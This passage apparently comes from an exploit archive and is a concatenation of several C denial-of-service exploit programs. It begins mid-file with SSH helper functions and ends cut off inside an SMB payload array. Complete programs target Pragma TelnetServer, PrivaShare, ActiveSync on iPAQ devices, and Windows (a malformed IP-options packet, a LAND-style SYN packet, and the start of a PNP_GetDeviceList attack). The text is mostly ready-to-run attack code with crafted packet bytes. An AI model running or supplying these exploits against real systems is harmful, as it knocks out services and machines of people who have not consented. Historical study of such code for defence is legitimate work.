        if(timeout(sd, 3) < 0) return(-1);
        t = recv(sd, p, len, 0);
        if(t <= 0) return(-1);
    }
    return(0);
}



int ssh_recv(int sd, u8 *buff) {
    u32     len;
    u8      tmp[4];

    if(tcp_recv(sd, tmp, 4) < 0) return(-1);
    getxx(tmp, &len, 32);
    if(len > BUFFSZ) return(0);
    if(tcp_recv(sd, buff, len) < 0) return(-1);
    printf("  %d bytes received\n", len);
    return(len);
}



int putsh(u8 *dst, u8 *str) {
    int     len;

    len = strlen(str);
    putxx(dst, len, 32);
    memcpy(dst + 4, str, len);
    return(4 + len);
}



int putcc(u8 *data, int chr, int len) {
    memset(data, chr, len);
    return(len);
}



int getxx(u8 *data, u32 *ret, int bits) {
    u32     num;
    int     i,
            bytes;

    bytes = bits >> 3;

    for(num = i = 0; i < bytes; i++) {
        num |= (data[i] << ((bytes - 1 - i) << 3));
    }

    *ret = num;
    return(bytes);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;

    for(i = 0; i < bytes; i++) {
        data[i] = (num >> ((bytes - 1 - i) << 3)) & 0xff;
    }

    return(bytes);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        23



int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            i;
    u16     port    = PORT;
    u8      buff[256],
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Pragma TelnetServer <= 7.0.4.589 Denial of Service "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    printf("- start connections (at least 75 needed):\n");

    for(i = 0; ; i++) {
        printf("- connection %d\n", i);

        sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sd < 0) std_err();
        if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();

        p = buff;
        *p++ = 0xff;    // telnet option
        *p++ = 0xfa;    // set option
        *p++ = 0x8a;    // option 0x8a
        *p++ = 0x7f;    // value
        *p++ = 0xff;    // telnet option
        *p++ = 0xf0;    // end of options
        if(send(sd, buff, p - buff, 0) < 0) goto quit;

        if((timeout(sd, 3) < 0) || (recv(sd, buff, sizeof(buff), 0) <= 0)) {
            if(i > 1) {
                printf("- Server IS vulnerable!!! wait some seconds before continuing the test\r");
                close(sd);
                sleep(ONESEC * 5);
                continue;
            }
            goto quit;
        }

        close(sd);
    }

    return(0);
quit:
    printf("\nError: something wrong during communication with the server\n");
    close(sd);
    return(1);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*

   PrivaShare TCP/IP DoS Exploit
----------------------------------------

Resolve host... [OK]
 [+] Connecting... [OK]
Target locked
Sending bad procedure... [OK]
 [+] Server DoS'ed

 Tested on Windows2000 SP4
 Greats: Infam0us Gr0up Team/member,and ll of u..take care!

 Info:
 - infamous.2hell.com
 - basher13@linuxmail.org

*/

#include <string.h>
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

char doscore[] =
/*

        Offset 0000ca10 to 0000ca2b

0000ca10 6c 00 69 00 73 00 74 00 4f 00 66 00 43 00
6f 00 6e 00 74 00 61 00 63 00 74 00 73 00

HEX:
6c 20 69 20 73 20 74 20 4f 20 66 20 43 20 6f 20 6e 20 74
20 61 20 63 20 74


*/
"listOfContacts,null"
"***          PrivaShare TCP/IP DoS Exploit        \n"
"***-----------------------------------------------\n"
"***   Infam0us Gr0up - Securiti Research Team     \n\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"
"***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n";



int main(int argc, char *argv[])
{
WSADATA wsaData;
WORD wVersionRequested;
struct hostent *pTarget;
struct sockaddr_in sock;
char *target;
int port,bufsize;
SOCKET inetdos;

if (argc < 2)
{
printf("        PrivaShare TCP/IP DoS Exploit \n", argv[0]);
printf("  ------------------------------------------\n", argv[0]);
printf("      Infam0us Gr0up - Securiti Research\n\n", argv[0]);
printf("[-]Usage: %s [target] [port]\n", argv[0]);
printf("[?]Exam: %s localhost 2001\n", argv[0]);
exit(1);
}

wVersionRequested = MAKEWORD(1, 1);
if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;

target = argv[1];
port = 2001;

if (argc >= 3) port = atoi(argv[2]);
bufsize = 1024;
if (argc >= 4) bufsize = atoi(argv[3]);

inetdos = socket(AF_INET, SOCK_STREAM, 0);
if(inetdos==INVALID_SOCKET)
{
printf("Socket ERROR \n");
exit(1);
}
printf("        PrivaShare TCP/IP DoS Exploit \n", argv[0]);
printf("  ------------------------------------------\r\n\n", argv[0]);
printf("Resolve host... ");
if ((pTarget = gethostbyname(target)) == NULL)
{
printf("FAILED \n", argv[0]);
exit(1);
}
printf("[OK]\n ");
memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
sock.sin_family = AF_INET;
sock.sin_port = htons((USHORT)port);

printf("[+] Connecting... ");
if ( (connect(inetdos, (struct sockaddr *)&sock, sizeof (sock) )))
{
printf("FAILED\n");
exit(1);
}
printf("[OK]\n");
printf("Target locked\n");
printf("Sending bad procedure... ");
if (send(inetdos, doscore, sizeof(doscore)-1, 0) == -1)
{
printf("ERROR\n");
closesocket(inetdos);
exit(1);
}
printf("[OK]\n ");
printf("[+] Server DoS'ed\n");
closesocket(inetdos);
WSACleanup();
return 0;
}

// milw0rm.com [2005-07-07]
source: http://www.securityfocus.com/bid/7150/info

A problem with ActiveSync could make it possible for remote users to trigger a denial of service.

It has been reported that under some circumstances, the ActiveSync wcescomm service can be forced to crash. Due to improper handling of some requests, the wcescomm process becomes unstable. This can result in the process crashing, requiring a manual restart to resume service.

/* iPAQ_Crash.c - by Andy Davis*/
/* Strictly for testing purposes only */
/* Compile with Microsoft VC++ */

#include <winsock.h>
#include <windows.h>
#include <stdio.h>

#define ASYNC_PORT 5679

int main(int argc, char **argv)
{

    unsigned char sendBuf[] =

/* Correct Header */

//"\x00\x00\x00\x00" /* Correct start of packet - by removing these 4
bytes the crash occurs */
"\x6e\x00\x00\x00" /* Length of the rest of the packet */
"\x24\x00\x00\x00"
"\x03\x00\xa3\x2b"
"\x11\x0a\x00\x00"
"\x00\x00\x00\x00"
"\xc3\x1d\xdd\x0c" /* 0xc31ddd0c Device Identifier */
"\x00\x00\x00\x00"
"\x24\x00\x00\x00" /* 0x24 pointer to "Pocket_PC" */
"\x38\x00\x00\x00" /* 0x38 pointer to "PocketPC" */
"\x4a\x00\x00\x00" /* 0x4a pointer to "Compaq iPAQ H3800" */

/* "Pocket_PC PocketPC Compaq iPAQ H3800" (in unicode) */

"\x50\x00\x6f\x00\x63\x00\x6b\x00\x65\x00\x74\x00"
"\x5f\x00\x50\x00\x43\x00\x00\x00\x50\x00\x6f\x00\x63\x00\x6b\x00"
"\x65\x00\x74\x00\x50\x00\x43\x00\x00\x00\x43\x00\x6f\x00\x6d\x00"
"\x70\x00\x61\x00\x71\x00\x20\x00\x69\x00\x50\x00\x41\x00\x51\x00"
"\x20\x00\x48\x00\x33\x00\x38\x00\x39\x00\x30\x00\x00\x00";


    struct sockaddr_in servAddr;
    int s;

		 WSADATA WSAData;
		 		 if(WSAStartup (MAKEWORD(1,1), &WSAData) != 0)
		 		 {
		 		 		 printf("WSAStartup failed.\n");
		 		 		 WSACleanup();
		 		 		 exit(1);
		 		 }


		 if (argc != 2)
		 {
		 		 printf ("\niPAQ_Crash\n");
		 		 printf ("\nUsage: %s <target IP address>\n",argv[0]);
		 		 exit (1);
		 }



    servAddr.sin_family = AF_INET;
    servAddr.sin_addr.s_addr = inet_addr(argv[1]);
    servAddr.sin_port = htons(ASYNC_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *) &servAddr, sizeof(servAddr));

    printf("Sending packet...");

		 if ( send(s, sendBuf, 118, 0) == 0)
    {
		 		 printf("Error sending packet...quitting\n\n");
		 		 exit (0);
    }


    closesocket(s);
    return(0);

}/* ecl-winipdos.c - 16/04/05
 * Yuri Gushin <yuri@eclipse.org.il>
 * Alex Behar <alex@eclipse.org.il>
 *
 * This one was actually interesting, an off-by-one by our beloved
 * M$ :)
 *
 * When processing an IP packet with an option size (2nd byte after
 * the option) of 39, it will crash - since the maximum available
 * size is 40 for the whole IP options field, and two are already used:
 *                 [ OPT ] [ SIZE ] [ 38 more bytes ]
 * Checks are done to validate that the option-size field is less than
 * 40, where a value less than !39! should be checked for validation.
 *
 * Note that this doesn't affect ALL options, and is also dependant upon
 * the underlying protocol.
 * Anyways, a small PoC to see how it works and why, tweak test and
 * explore, have fun :)
 *
 *
 * Greets fly out to the ECL crew, Valentin Slavov, blexim, stranger,
 * manevski, elius, shrink, Evgeny Pinchuk, Ishay Sommer, and anyone else
 * who got left out :D
 *
 */


#ifndef _BSD_SOURCE
#define _BSD_SOURCE
#endif

#include <stdio.h>
#include <string.h>
#include <time.h>
#include <libnet.h>

#define IP_H 20
#define IPOPTS_MAX 40

void banner();
void usage(char *);

int main(int argc, char **argv)
{
  char errbuf[LIBNET_ERRBUF_SIZE];
  libnet_t *l;
  char *device = NULL;

  int c;
  u_char *buf;
  int packet_len = 0;
  
  struct ip *IP;
  struct tcphdr *TCP;
  u_int32_t src = 0, dst = 0;

 
  banner();
  if (argc < 4) usage(argv[0]);

  if ((l = libnet_init(LIBNET_RAW4, device, errbuf)) == NULL) {
    fprintf(stderr, "libnet_init() failed: %s", errbuf);
    exit(-1);
  }
  
  if ((src = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE)) == -1) {
    fprintf(stderr, "Unresolved source address\n");
    exit(-1);
  }
  if ((dst = libnet_name2addr4(l, argv[2], LIBNET_RESOLVE)) == -1) {
    fprintf(stderr, "Unresolved destination address\n");
    exit(-1);
  }

  if ( (buf = malloc(IP_MAXPACKET)) == NULL ) {
    perror("malloc");
    exit(-1);
  }

  buf[20] = atoi(argv[3]);
  buf[21] = 39;                      // our malformed size

  for (c = 0; c<38; c+=3)
    strncpy(&buf[22+c], "ECL", 3);   // padding

  TCP = (struct tcphdr *)(buf + IP_H + IPOPTS_MAX);
  TCP->th_off = 5;

  packet_len = IP_H + IPOPTS_MAX + (TCP->th_off << 2);

  srand(time(NULL));
  IP = (struct ip *) buf;
  IP->ip_v    = 4;                   /* version 4 */
  IP->ip_hl   = 5 + (IPOPTS_MAX / 4);/* 60 byte header */
  IP->ip_tos  = 0;                   /* IP tos */
  IP->ip_len  = htons(packet_len);   /* total length */
  IP->ip_id   = rand();              /* IP ID */
  IP->ip_off  = htons(0);            /* fragmentation flags */
  IP->ip_ttl  = 64;                  /* time to live */
  IP->ip_p    = IPPROTO_TCP;         /* transport protocol */
  IP->ip_sum  = 0;
  IP->ip_src.s_addr = src;
  IP->ip_dst.s_addr = dst;

  TCP->th_sport = htons(1337);
  TCP->th_dport = htons(80);
  TCP->th_seq	= 0;
  TCP->th_ack	= 0;
  TCP->th_x2	= 0;
  TCP->th_flags	= TH_SYN;
  TCP->th_win	= rand() & 0xffff;
  TCP->th_sum	= 0;
  TCP->th_urp = 0;

  libnet_do_checksum(l, (u_int8_t *)buf, IPPROTO_TCP, TCP->th_off << 2);

  if ((c = libnet_write_raw_ipv4(l, buf, packet_len)) == -1)
    {
      fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
      exit(-1);
    }
            
  printf("Packet sent.\n");

  libnet_destroy(l);
  free(buf);
  return (0);
}

void usage(char *cmd)
{
  printf("Usage: %s <source> <destination> <option>\n",cmd);
  exit(-1);
}

void banner()
{
  printf("\t\tWindows malformed IP Options DoS exploit\n"
         "\t\t   Yuri Gushin <yuri@eclipse.org.il>\n"
         "\t\t    Alex Behar <alex@eclipse.org.il>\n"
         "\t\t\t       ECL Team\n\n\n");
}

// milw0rm.com [2005-04-17]
/* Added Line #1 - BSD_SOURCE!!!!  /str0ke */

#define _BSD_SOURCE

#include <stdio.h> 
#include <ctype.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <netinet/in_systm.h> 
#include <netinet/ip.h> 
#include <netinet/tcp.h> 
#include <sysexits.h> 
#include <stdlib.h> 
#include <unistd.h> 
#include <sys/types.h> 

/*  
Windows Server 2003 and XP SP2 remote DoS exploit 
Tested under OpenBSD 3.6 at WinXP SP 2 
Vuln by Dejan Levaja <dejan_@_levaja.com> , http://security.nnov.ru/docs7998.html
(c)oded by __blf 2005 RusH Security Team , http://rst.void.ru 
Gr33tz: zZz, Phoenix, MishaSt, Inck-vizitor 
Fuck lamerz: Saint_I, nmalykh, Mr. Clumsy 
All rights reserved. 
*/ 

//checksum function by r0ach 
u_short checksum (u_short *addr, int len) 
{ 
u_short *w = addr; 
int i = len; 
int sum = 0; 
u_short answer; 
while (i > 0) 
{ 
sum += *w++; 
i-=2; 
} 
if (i == 1) sum += *(u_char *)w; 
sum = (sum >> 16) + (sum & 0xffff); 
sum = sum + (sum >> 16); 
return (~sum); 
} 
int main(int argc, char ** argv) 
{ 
struct in_addr src, dst; 
struct sockaddr_in sin; 
struct _pseudoheader { 
struct in_addr source_addr; 
struct in_addr destination_addr; 
u_char zero; 
u_char protocol; 
u_short length; 
} pseudoheader; 
struct ip * iph; 
struct tcphdr * tcph; 
int mysock; 
u_char * packet; 
u_char * pseudopacket; 
int on = 1; 
if( argc != 3) 
{ 
fprintf(stderr, "r57windos.c by __blf\n"); 
fprintf(stderr, "RusH Security Team\n"); 
fprintf(stderr, "Usage: %s <dest ip> <dest port>\n", argv[0]); 
return EX_USAGE; 
} 
if ((packet = (char *)malloc(sizeof(struct ip) + sizeof(struct tcphdr))) == NULL) 
{ 
perror("malloc()\n"); 
return EX_OSERR; 
} 
inet_aton(argv[1], &src); 
inet_aton(argv[1], &dst); 
iph = (struct ip *) packet; 
iph->ip_v = IPVERSION; 
iph->ip_hl = 5; 
iph->ip_tos = 0; 
iph->ip_len = ntohs(sizeof(struct ip) + sizeof(struct tcphdr)); 
iph->ip_off = htons(IP_DF); 
iph->ip_ttl = 255; 
iph->ip_p = IPPROTO_TCP; 
iph->ip_sum = 0; 
iph->ip_src = src; 
iph->ip_dst = dst; 
tcph = (struct tcphdr *)(packet +sizeof(struct ip)); 
tcph->th_sport = htons(atoi(argv[2])); 
tcph->th_dport = htons(atoi(argv[2])); 
tcph->th_seq = ntohl(rand()); 
tcph->th_ack = rand(); 
tcph->th_off = 5; 
tcph->th_flags = TH_SYN;  // setting up TCP SYN flag here 
tcph->th_win = htons(512); 
tcph->th_sum = 0; 
tcph->th_urp = 0; 
pseudoheader.source_addr = src; 
pseudoheader.destination_addr = dst; 
pseudoheader.zero = 0; 
pseudoheader.protocol = IPPROTO_TCP; 
pseudoheader.length = htons(sizeof(struct tcphdr)); 
if((pseudopacket = (char *)malloc(sizeof(pseudoheader)+sizeof(struct tcphdr))) == NULL) 
{ 
perror("malloc()\n"); 
return EX_OSERR; 
} 
memcpy(pseudopacket, &pseudoheader, sizeof(pseudoheader)); 
memcpy(pseudopacket + sizeof(pseudoheader), packet + sizeof(struct ip), sizeof(struct tcphdr)); 
tcph->th_sum = checksum((u_short *)pseudopacket, sizeof(pseudoheader) + sizeof(struct tcphdr)); 
mysock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW); 
if(!mysock) 
{ 
perror("socket!\n"); 
return EX_OSERR; 
} 
if(setsockopt(mysock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) == -1) 
{ 
perror("setsockopt"); 
shutdown(mysock, 2); 
return EX_OSERR; 
} 
sin.sin_family = PF_INET; 
sin.sin_addr = dst; 
sin.sin_port = htons(80); 
if(sendto(mysock, packet, sizeof(struct ip) + sizeof(struct tcphdr), 0, (struct sockaddr *)&sin, sizeof(sin)) == -1) 
{ 
perror("sendto()\n"); 
shutdown(mysock, 2); 
return EX_OSERR; 
} 
printf("Packet sent. Remote machine should be down.\n"); 
shutdown(mysock, 2); 
return  EX_OK; 
} 

// milw0rm.com [2005-03-07]
// tested and approved /str0ke

/* Program: Denial of Service attack for MS UMPNPMGR PNP_GetDeviceList
 * Author: Winny Thomas
 * Vulnerability: no length checking on passed parameter to PNP_GetDeviceList in UMPNPMGR.dll
 * Note: The code crashes services.exe on the target, effectively bringing down the target against which its run.
 * This code is for educational/testing purposes by authorized persons on networks systems setup for such purposes
 * The author shall bear no responsibility for any damage caused by using this code.
*/

#include <stdio.h>
#include <stdlib.h> //added /str0ke (we don't want errors)
#include <string.h> //added /str0ke (memcpy loves me)
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>

char SMB_Negotiate[] =
"\x00\x00\x00\x85\xFF\x53\x4D\x42\x72\x00\x00\x00\x00\x18\x53\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4E\x45\x54\x57\x4F"
"\x52\x4B\x20\x50\x52\x4F\x47\x52\x41\x4D\x20\x31\x2E\x30\x00\x02"
"\x4C\x41\x4E\x4D\x41\x4E\x31\x2E\x30\x00\x02\x57\x69\x6E\x64\x6F"
"\x77\x73\x20\x66\x6F\x72\x20\x57\x6F\x72\x6B\x67\x72\x6F\x75\x70"
"\x73\x20\x33\x2E\x31\x61\x00\x02\x4C\x4D\x31\x2E\x32\x58\x30\x30"
"\x32\x00\x02\x4C\x41\x4E\x4D\x41\x4E\x32\x2E\x31\x00\x02\x4E\x54"
"\x20\x4C\x4D\x20\x30\x2E\x31\x32\x00" ;

char SMB_Session_setup_ANDX1[] =
"\x00\x00\x00\xA4\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x00\x10\x00\x0C\xFF\x00\xA4\x00\x04\x11\x0A\x00\x00\x00\x00"
"\x00\x00\x00\x20\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x69\x00\x4E"
"\x54\x4C\x4D\x53\x53\x50\x00\x01\x00\x00\x00\x97\x82\x08\xE0\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00"
"\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00"
"\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00"
"\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00"
"\x2E\x00\x30\x00\x00\x00\x00\x00";

char SMB_Session_setup_ANDX2[] =
"\x00\x00\x00\xDA\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x08\x20\x00\x0C\xFF\x00\xDA\x00\x04\x11\x0A\x00\x00\x00\x00"
"\x00\x00\x00\x57\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x9F\x00\x4E"
"\x54\x4C\x4D\x53\x53\x50\x00\x03\x00\x00\x00\x01\x00\x01\x00\x46"
"\x00\x00\x00\x00\x00\x00\x00\x47\x00\x00\x00\x00\x00\x00\x00\x40"
"\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x06\x00\x06\x00\x40"
"\x00\x00\x00\x10\x00\x10\x00\x47\x00\x00\x00\x15\x8A\x88\xE0\x48"
"\x00\x4F\x00\x44\x00\x00\xED\x41\x2C\x27\x86\x26\xD2\x59\xA0\xB3"
"\x5E\xAA\x00\x88\x6F\xC5\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00"
"\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00"
"\x32\x00\x31\x00\x39\x00\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00"
"\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00"
"\x30\x00\x20\x00\x35\x00\x2E\x00\x30\x00\x00\x00\x00\x00";

char SMB_TreeConnect_ANDX[] =
"\x00\x00\x00\x58\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x08\x30\x00\x04\xFF\x00\x5A\x00\x08\x00\x01\x00\x2D\x00\x00";

char SMB_NTCreate_ANDX_Request[] =
"\x00\x00\x00\x66\xff\x53\x4d\x42\xa2\x00\x00\x00\x00\x18\x07\xc8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe"
"\x00\x08\x40\x00\x18\xff\x00\xde\xde\x00\x10\x00\x16\x00\x00\x00"
"\x00\x00\x00\x00\x9f\x01\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x40\x00\x00\x00"
"\x02\x00\x00\x00\x03\x13\x00\x00\x5c\x00\x62\x00\x72\x00\x6f\x00"
"\x77\x00\x73\x00\x65\x00\x72\x00\x00\x00";

char DCERPC_Bind_RPC_Service[] =
"\x00\x00\x00\x9A\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x08\x01\xC0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
"\x00\x08\x01\x00\x10\x00\x00\x48\x00\x00\x00\x48\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x52\x00\x48\x00\x52\x00\x02"
"\x00\x26\x00\x00\x40\x57\x00\x00\x5C\x00\x50\x00\x49\x00\x50\x00"
"\x45\x00\x5C\x00\x00\x00\x05\x00\x0B\x03\x10\x00\x00\x00\x48\x00"
"\x00\x00\x00\x00\x00\x00\xD0\x16\xD0\x16\x00\x00\x00\x00\x01\x00"
"\x00\x00\x00\x00\x01\x00\x40\x4E\x9F\x8D\x3D\xA0\xCE\x11\x8F\x69"
"\x08\x00\x3E\x30\x05\x1B\x01\x00\x00\x00\x04\x5D\x88\x8A\xEB\x1C"
"\xC9\x11\x9F\xE8\x08\x00\x2B\x10\x48\x60\x02\x00\x00\x00";

char PNP_GetDeviceList_Request[] =
"\x00\x00\x08\x84\xff\x53\x4d\x42\x25\x00\x00\x00\x00\x18\x07\xc8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
"\x00\x08\x80\x01\x10\x00\x00\x30\x08\x00\x00\x00\x10\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\x30\x08\x54\x00\x02"
"\x00\x26\x00\x00\x40\x41\x08\xa2\x5c\x00\x50\x00\x49\x00\x50\x00"
"\x45\x00\x5c\x00\x00\x00\x00\x00\x05\x00\x00\x03\x10\x00\x00\x00"
"\x30\x08\x00\x00\x01\x00\x00\x00\x18\x08\x00\x00\x00\x00\x0a\x00"
"\x44\xf7\x12\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00"
"\x48\x00\x54\x00\x52\x00\x45\x00\x45\x00\x5c\x00\x52\x00\x4f\x00"
"\x4f\x00\x54\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
"\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00\x5c\x00"
